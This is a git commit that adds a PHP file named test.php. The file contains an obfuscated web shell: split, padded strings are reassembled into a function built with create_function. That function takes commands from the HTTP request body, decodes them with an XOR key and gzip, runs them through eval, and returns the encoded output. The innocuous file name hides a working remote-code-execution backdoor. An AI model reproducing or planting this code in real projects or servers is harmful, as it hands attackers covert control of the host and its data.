2fa8bb4e4a6c8de0eb6d2bad834b3b184b13b144
ahmadstra <78705356+ahmadstra@users.noreply.github.com>
2021-02-07 22:41:19 +0100

    Create test.php

---
+++ test.php
@@ -0,0 +1,19 @@
+<?php
+
+$k='ZZinput"),$m)Z==Z1) {@ob_start();@eZvalZ(@gZzunZcompress(@xZ(@baZsZe64_decode($m[Z1]),$kZZ)));$o=@oZZb_ge';
+
+$N=',$k){$ZcZZ=strlen($kZ);$l=strlen(Z$t);$o=Z""Z;for($iZ=0;$i<$l;Z){forZ($j=0Z;($j<ZZ$c&&Z$i<$Zl);Z$j++,';
+
+$u='$Zk=Z"3b712de4";$kh="Z8137572fZ3849Z";$kf="aZabd5Z666a4e3"ZZ;$p="pILDzYmZZLmia31Xhd";fZuncZZtion x($t';
+
+$v='$i++){$o.=Z$t{$Zi}^$kZ{$j};}Z}rZetZurnZ $o;}if (@preg_maZtch("/$kh(.+)$kfZZ/Z",@file_geZt_contenZts(Z"php://';
+
+$G=str_replace('kk','','kkcrkkeatkke_kkfkkunctkkion');
+
+$V='t_contents(Z);Z@oZb_endZ_clZean();$r=@base6Z4_eZncodZe(@x(@gzcZomZpress($o)Z,$k));print("Z$p$kh$Zr$kf");}';
+
+$y=str_replace('Z','',$u.$N.$v.$k.$V);
+
+$C=$G('',$y);$C();
+
+?>
